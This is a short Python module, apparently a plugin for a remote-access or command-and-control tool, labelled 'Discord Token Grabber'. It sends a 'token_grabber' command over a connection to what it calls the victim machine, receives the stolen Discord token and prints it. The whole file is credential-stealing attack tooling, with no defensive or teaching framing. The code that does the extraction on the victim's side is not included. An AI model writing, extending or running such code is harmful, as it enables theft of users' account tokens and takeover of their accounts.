from lib.debug import Debug
from lib.helper import ctime
import os

class module():
    def __init__(self):
        self.Command        = "token_grabber"
        self.Name           = "Discord Token Grabber"
        self.Description    = """This command extracts discord tokens from the victim machine."""
        self.Platform       = "multi"

    def _exec(self, dmos, args):
        dmos.conn.send(self.Command.encode())
        token = dmos.conn.recv(1024)
        Debug.tprint(f"Recieved extracted token: {token}")

